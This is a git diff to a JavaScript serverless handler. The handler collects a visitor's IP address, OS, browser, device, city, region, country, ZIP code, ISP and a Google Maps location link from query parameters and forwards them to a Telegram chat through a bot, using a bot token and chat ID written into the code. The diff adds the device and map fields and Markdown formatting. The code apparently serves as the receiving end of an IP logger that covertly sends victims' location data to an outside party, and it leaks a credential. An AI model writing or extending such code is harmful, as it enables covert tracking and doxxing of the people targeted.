@@ -3,6 +3,7 @@ export default async function handler(req, res) {
     ip = "UNKNOWN",
     os = "UNKNOWN",
     browser = "UNKNOWN",
+    device = "UNKNOWN",
     city = "UNKNOWN",
     region = "UNKNOWN",
     country = "UNKNOWN",
@@ -11,6 +12,7 @@ export default async function handler(req, res) {
     isp = "UNKNOWN",
     org = "UNKNOWN",
     as = "UNKNOWN",
+    maps = "",
     time = new Date().toISOString()
   } = req.query;
 
@@ -20,7 +22,9 @@ export default async function handler(req, res) {
 🔹 IP: ${ip}
 💻 OS: ${os}
 🌐 Browser: ${browser}
+📱 Device: ${device}
 📍 Location: ${city}, ${region}, ${country}
+🌍 Google Maps: [🔗 Open Map](${maps})
 📮 ZIP: ${zip}
 🕒 Timezone: ${timezone}
 📡 ISP: ${isp}
@@ -32,7 +36,7 @@ export default async function handler(req, res) {
   const botToken = "8172380019:AAHubU3XKILFTcTRC7qGGUCOUYeCkDMaAOs";
   const chatId = "7168737724";
 
-  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
 
   try {
     const response = await fetch(url);
